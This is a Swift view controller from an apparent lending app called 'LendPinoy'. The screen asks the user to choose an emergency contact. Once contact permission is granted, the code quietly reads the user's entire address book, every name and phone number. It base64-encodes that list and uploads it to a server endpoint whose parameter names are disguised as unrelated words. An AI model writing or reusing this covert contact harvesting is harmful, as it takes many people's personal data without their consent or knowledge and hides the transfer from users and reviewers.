//
//  WUViewController.swift
//  LendPinoy
//
//  Created by Andrew on 2024/9/6.
//

import UIKit
import RxRelay
import SwiftyJSON
import Contacts
import ContactsUI

class WUViewController: LPBaseViewController {
    
    var chanpinID = BehaviorRelay<String>(value: "")
    
    var upBl: Bool = false
    
    var wuti: String?
    
    lazy var tpView: LPThreePView = {
        let tpView = LPThreePView()
        tpView.navView.titleLabel.text = "Contact Information"
        return tpView
    }()
    
    lazy var pickerVc: CNContactPickerViewController = {
        let pickerVc = CNContactPickerViewController()
        pickerVc.displayedPropertyKeys = [CNContactPhoneNumbersKey]
        pickerVc.delegate = self
        return pickerVc
    }()
    
    var currentCell: LPThreePViewCell?
    
    var modelArray = BehaviorRelay<[dazedModel]>(value: [])
    
    override func viewDidLoad() {
        super.viewDidLoad()
        makeuu()
        makeainfo()
        wuti = SystemInfo.getCurrentTime()
    }
    
}

extension WUViewController {
    
    func makeuu() {
        view.addSubview(tpView)
        tpView.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        
        tpView.navView.block = { [weak self] in
            if let navigationController = self?.navigationController {
                if let targetViewController = navigationController.viewControllers.first(where: { $0 is LPOrderListViewController }) {
                    navigationController.popToViewController(targetViewController, animated: true)
                } else {
                    self?.navigationController?.popToRootViewController(animated: true)
                }
            }
        }
        
        tpView.tapBlock = { [weak self] cell, model in
            self?.huoqulianxirenqunaxian(from: cell, model: model)
        }
        
        tpView.comfirmblock = { [weak self] in
            if let modelArray = self?.modelArray.value {
                let resultArray = modelArray.map { model -> [String: Any] in
                    return ["uncle": model.uncle ?? "",
                            "smiled": model.smiled ?? "",
                            "aunt": "s2",
                            "peanut": String(Int.random(in: 1...9)),
                            "quench": model.quench ?? "",
                            "restaurants": model.restaurants ?? ""]
                }
                let jsonStr = self?.arrayToJSONString(resultArray)
                if let jsonString = jsonStr {
                    let man = LPRequestManager()
                    man.uploadDataAPI(params: ["itself": jsonString, "reminder": self?.chanpinID.value ?? "", "method": "oil"], pageUrl: "/lpinoy/about/wardkoishi/months", method: .post) { result in
                        switch result {
                        case .success(let success):
                            self?.maiInfopoint("7", self?.wuti ?? "", SystemInfo.getCurrentTime(), self?.chanpinID.value ?? "")
                            DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) {
                                self?.chanpinxiangqingyemian(self?.chanpinID.value ?? "")
                            }
                            let model = success.itself
                            print("model:\(model)")
                            break
                        case .failure(_):
                            break
                        }
                    }
                }
            }
        }
        
    }
    
    func makeainfo() {
        let dict = ["mum": "1", "down": "1", "reminder": chanpinID.value, "up": "0"]
        let man = LPRequestManager()
        man.requestAPI(params: dict, pageUrl: "/lpinoy/purse/along/spilling", method: .post) { [weak self] result in
            switch result {
            case .success(let success):
                if let modelArray = success.itself.joy?.dazed {
                    self?.modelArray.accept(modelArray)
                    self?.tpView.modelArray.accept(modelArray)
                    self?.tpView.tableView.reloadData()
                }
                break
            case .failure(_):
                break
            }
        }
    }
    
    func huoqulianxirenqunaxian(from cell: LPThreePViewCell, model: dazedModel) {
        self.currentCell = cell
        CCompletionManager.ccPersion { [weak self] result in
            if result {
                self?.fetchContacts(completion: { array in
                    self?.scconxinxi(form: array)
                })
                if let kaiseki = model.kaiseki {
                    let modelArray = LPXuanZeManager.oneModel(sourceArr: kaiseki, level: 1)
                    TanchuXuanZeMananger.showCPicker(from: .province, model: model, label: cell.label1, dataArray: modelArray) { s1, s2 in
                        if let pickerVc = self?.pickerVc {
                            pickerVc.modalPresentationStyle = .fullScreen
                            self?.present(pickerVc, animated: true, completion: nil)
                        }
                    }
                }
            } else {
                if let self = self {
                    self.showPerrt(in: self)
                }
            }
        }
    }
    
    func showPerrt(in viewController: UIViewController) {
        let alert = UIAlertController(
            title: "Contacts Access Required",
            message: "Please enable contact permissions in Settings.",
            preferredStyle: .alert
        )
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel))
        alert.addAction(UIAlertAction(title: "Open Settings", style: .default) { _ in
            if let url = URL(string: UIApplication.openSettingsURLString) {
                UIApplication.shared.open(url)
            }
        })
        viewController.present(alert, animated: true)
    }
    
    func fetchContacts(completion: @escaping ([[String: Any]]?) -> Void) {
        let keysToFetch: [CNKeyDescriptor] = [
            CNContactGivenNameKey as NSString,
            CNContactFamilyNameKey as NSString,
            CNContactPhoneNumbersKey as NSString,
            CNContactEmailAddressesKey as NSString
        ]
        let fetchRequest = CNContactFetchRequest(keysToFetch: keysToFetch)
        let contactStore = CNContactStore()
        DispatchQueue.global(qos: .userInitiated).async {
            var contactsArray: [[String: Any]] = []
            do {
                try contactStore.enumerateContacts(with: fetchRequest) { (contact, stop) in
                    let phoneNumbers = contact.phoneNumbers.map { $0.value.stringValue }
                    let phString = phoneNumbers.isEmpty ? "" : phoneNumbers.joined(separator: ",")
                    let conInfo: [String: Any] = [
                        "appetizers": "01",
                        "quench": contact.givenName + contact.familyName,
                        "partitioned": "sbo",
                        "vaguely": phString,
                        "smaller": SystemInfo.getLastTime(),
                        "encouragingly": "total",
                        "selection": "01"
                    ]
                    contactsArray.append(conInfo)
                }
                completion(contactsArray)
            } catch {
                print("Error fetching contacts: \(error)")
            }
        }
    }
    
    func scconxinxi(form array: [[String: Any]]?) {
        if !upBl {
            let data = try? JSONSerialization.data(withJSONObject: array!, options: [])
            let bData = data?.base64EncodedString() ?? ""
            let dict = ["separa": "m1",
                        "fish": "hangyu",
                        "separately": "3",
                        "itself": bData,
                        "grilled": "best"]
            let man = LPRequestManager()
            man.uploadDataAPI(params: dict, pageUrl: "/lpinoy/might/worth/nobuko", method: .post) { [weak self] result in
                switch result {
                case .success(let success):
                    print("success:\(success)")
                    self?.upBl = true
                    break
                case .failure(let failure):
                    self?.upBl = false
                    print("failure:\(failure)")
                    break
                }
            }
        }
    }
    
}

extension WUViewController: CNContactPickerDelegate {
    
    
    func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
        let nameStr = contact.givenName + " " + contact.familyName
        if let phoneNumber = contact.phoneNumbers.first?.value {
            let numberStr = phoneNumber.stringValue
            if let currentCell = self.currentCell {
                currentCell.label2.text = nameStr
                currentCell.label3.text = numberStr
                currentCell.label2.textColor = UIColor.init(hex: "#303434")
                currentCell.label3.textColor = UIColor.init(hex: "#303434")
                currentCell.model.value?.quench = nameStr
                currentCell.model.value?.restaurants = numberStr
            }
        }
    }
    
    func contactPickerDidCancel(_ picker: CNContactPickerViewController) {
        print("Contact selection canceled")
    }
    
    func arrayToJSONString(_ array: [Any]) -> String? {
        do {
            // Convert array to JSON data
            let jsonData = try JSONSerialization.data(withJSONObject: array, options: [])
            // Convert JSON data to String
            let jsonString = String(data: jsonData, encoding: .utf8)
            return jsonString
        } catch {
            print("Error converting array to JSON string: \(error)")
            return nil
        }
    }
    
}
